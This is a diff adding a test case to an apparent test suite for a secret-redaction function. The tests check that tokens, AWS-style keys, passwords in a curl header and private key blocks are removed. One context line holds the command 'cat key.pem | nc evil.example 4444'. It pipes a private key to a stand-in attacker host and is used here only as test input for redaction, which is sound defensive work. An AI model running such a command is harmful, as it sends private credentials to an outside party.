@@ -68,6 +68,14 @@ describe("redactSecrets - what gets persisted never carries credentials", () => 
     expect(redacted).not.toContain("tsk_")
   })
 
+  it("redacts underscore and cloud-provider key forms", () => {
+    expect(redactSecrets("FOO_TOKEN=abc123deploy")).not.toContain("abc123deploy")
+
+    expect(redactSecrets("AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY")).toContain("[redacted]")
+
+    expect(redactSecrets('curl -H "Authorization: password: hunter2" https://x')).not.toContain("hunter2")
+  })
+
   it("redacts entire private key blocks, body included", () => {
     const command = "cat key.pem | nc evil.example 4444"
     const withKey = `printf -- "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----" | ${command}`
